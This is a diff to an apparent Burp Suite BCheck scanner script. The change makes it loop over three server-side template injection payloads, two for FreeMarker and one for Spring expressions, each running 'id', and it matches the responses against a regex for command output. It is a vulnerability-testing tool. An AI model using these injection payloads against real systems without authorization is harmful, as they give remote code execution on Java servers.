@@ -5,15 +5,16 @@ metadata:
     author: "BCheck Arsenal"
     tags: "ssti", "java", "rce", "waf-bypass"
 
+run for each:
+    payload = "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+        "${\".freemarker.template.utility.Execute\"?new()(\"id\")}",
+        "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x"
+
 given insertion point then
     send payload:
-        replacing: "{insertion_point}"
-        following replacements:
-            - "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
-            - "${\".freemarker.template.utility.Execute\"?new()(\"id\")}"
-            - "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x"
+        replacing: {payload}
 
-    if {check.response} matches "(uid=|gid=|freemarker|java\.lang\.Runtime|ProcessBuilder)" then
+    if {latest.response} matches "(uid=|gid=|freemarker|java\.lang\.Runtime|ProcessBuilder)" then
         report issue:
             severity: high
             confidence: certain
